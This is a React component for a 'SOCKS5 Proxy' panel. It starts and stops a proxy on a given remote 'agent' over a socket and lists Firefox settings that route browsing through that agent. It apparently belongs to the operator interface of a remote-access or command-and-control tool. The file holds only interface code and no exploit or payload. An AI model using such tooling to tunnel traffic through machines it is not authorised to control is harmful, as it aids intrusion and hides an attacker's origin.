import { useState, useEffect } from "react";
import { on } from "../../socket/events";
import { send } from "../../socket";

const M = "var(--rd-metal-base)";
const MHI = "var(--rd-metal-hi)";
const MLO = "var(--rd-metal-lo)";
const MT = "var(--rd-metal-text)";
const MM = "var(--rd-metal-muted)";
const LED_ON = "var(--rd-led-on)";
const LED_OFF = "var(--rd-led-off)";
const LED_GLOW = "var(--rd-led-glow)";
const KEY_BG = "var(--rd-key-bg)";
const KEY_HI = "var(--rd-key-hi)";
const KEY_LO = "var(--rd-key-lo)";
const KEY_T = "var(--rd-key-text)";
const MONO = '"Consolas", "Courier New", monospace';

function Key({ label, active, danger, onClick }) {
  const [pressed, setPressed] = useState(false);
  const bg = danger ? (pressed ? "#7f1d1d" : "#dc2626") : active ? (pressed ? "#14532d" : "#16a34a") : (pressed ? MLO : KEY_BG);
  const textColor = (danger || active) ? "#fff" : KEY_T;
  return (
    <button
      onMouseDown={() => setPressed(true)}
      onMouseUp={() => { setPressed(false); onClick(); }}
      onMouseLeave={() => setPressed(false)}
      style={{
        background: bg,
        border: "none", borderRadius: 4,
        boxShadow: pressed
          ? `inset 0 2px 5px ${MLO}, 0 1px 0 ${KEY_HI}`
          : `0 4px 0 ${KEY_LO}, 0 1px 0 ${KEY_HI}, inset 0 1px 0 rgba(255,255,255,0.07)`,
        padding: "7px 18px", cursor: "pointer",
        transform: pressed ? "translateY(3px)" : "translateY(0)",
        transition: "transform 0.05s, box-shadow 0.05s, background 0.1s",
        userSelect: "none",
      }}
    >
      <span style={{ fontFamily: MONO, fontSize: 12, fontWeight: 700, color: textColor, letterSpacing: "0.04em" }}>
        {label}
      </span>
    </button>
  );
}

function Row({ k, v, onCopy }) {
  return (
    <div style={{ display: "flex", justifyContent: "space-between", gap: 12, fontFamily: MONO, fontSize: 10, padding: "1px 0" }}>
      <span style={{ color: MM }}>{k}</span>
      <span style={{ color: LED_ON, cursor: "pointer" }} onClick={() => onCopy(v)} title="click to copy">{v}</span>
    </div>
  );
}

export default function Socks5({ agent }) {
  const [active, setActive] = useState(false);
  const [info, setInfo] = useState(null);
  const [showInfo, setShowInfo] = useState(true);

  useEffect(() => {
    const un1 = on("socks5_active", (p) => {
      if (p && String(p.agent_id) === String(agent.id)) {
        setActive(true);
        setInfo(p);
        setShowInfo(true);
      }
    });
    const un2 = on("socks5_inactive", (p) => {
      if (p && String(p.agent_id) === String(agent.id)) {
        setActive(false);
        setInfo(null);
      }
    });
    send("socks5_get", { agent_id: agent.id });
    return () => { un1(); un2(); };
  }, [agent.id]);

  const toggle = () => {
    if (active) {
      send("socks5_stop", { agent_id: agent.id });
    } else {
      send("socks5_start", { agent_id: agent.id });
    }
  };

  const host = info?.host ?? "";
  const copy = (v) => navigator.clipboard.writeText(v);

  return (
    <div style={{
      height: "100%", display: "flex", flexDirection: "column",
      background: M,
      backgroundImage: "repeating-linear-gradient(180deg, transparent 0px, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 3px)",
      padding: 16, gap: 14, overflowY: "auto",
    }}>
      <div style={{ fontFamily: MONO, fontSize: 11, color: MT, fontWeight: 700, letterSpacing: "0.04em", borderBottom: `1px solid ${MHI}`, paddingBottom: 8 }}>
        SOCKS5 Proxy
      </div>

      <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
        <span style={{
          width: 10, height: 10, borderRadius: "50%", flexShrink: 0,
          background: active ? LED_ON : LED_OFF,
          boxShadow: active ? `0 0 8px 2px ${LED_GLOW}` : "none",
          transition: "background 0.2s, box-shadow 0.2s",
        }} />
        <span style={{ fontFamily: MONO, fontSize: 12, color: MT, flex: 1 }}>
          {active ? "Proxy Active" : "Proxy Inactive"}
        </span>
        <Key
          label={active ? "Stop" : "Start"}
          active={!active}
          danger={active}
          onClick={toggle}
        />
      </div>

      {active && info && (
        <>
          <div style={{ borderTop: `1px solid ${MHI}`, paddingTop: 10 }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
              <span style={{ fontFamily: MONO, fontSize: 9, color: MM, letterSpacing: "0.1em", textTransform: "uppercase" }}>Connection</span>
              <button
                onClick={() => setShowInfo(v => !v)}
                style={{ background: "transparent", border: `1px solid ${MHI}`, borderRadius: 3, color: MM, padding: "2px 8px", cursor: "pointer", fontFamily: MONO, fontSize: 9 }}
              >
                {showInfo ? "▾ Hide" : "▸ Show"}
              </button>
            </div>

            {showInfo && (
              <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                <div style={{
                  background: MLO, borderRadius: 4, padding: "8px 10px",
                  fontFamily: MONO, fontSize: 10, color: LED_ON,
                  wordBreak: "break-all", cursor: "pointer",
                  border: `1px solid ${MHI}`,
                }} onClick={() => copy(info.proxy_url)} title="click to copy">
                  {info.proxy_url}
                </div>

                <div style={{ display: "flex", gap: 6 }}>
                  <Key label="Copy URL" onClick={() => copy(info.proxy_url)} />
                </div>

                <div style={{ background: MLO, borderRadius: 4, padding: "10px 12px", border: `1px solid ${MHI}`, display: "flex", flexDirection: "column", gap: 3 }}>
                  <div style={{ fontFamily: MONO, fontSize: 9, color: MM, letterSpacing: "0.1em", textTransform: "uppercase", marginBottom: 6 }}>Firefox about:config</div>
                  <Row k="network.proxy.type" v="1" onCopy={copy} />
                  <Row k="network.proxy.socks" v={host} onCopy={copy} />
                  <Row k="network.proxy.socks_port" v={String(info.port)} onCopy={copy} />
                  <Row k="network.proxy.socks_version" v="5" onCopy={copy} />
                  <Row k="network.proxy.socks_remote_dns" v="true" onCopy={copy} />
                  <Row k="network.proxy.no_proxies_on" v="(clear)" onCopy={copy} />
                </div>
              </div>
            )}
          </div>
        </>
      )}
    </div>
  );
}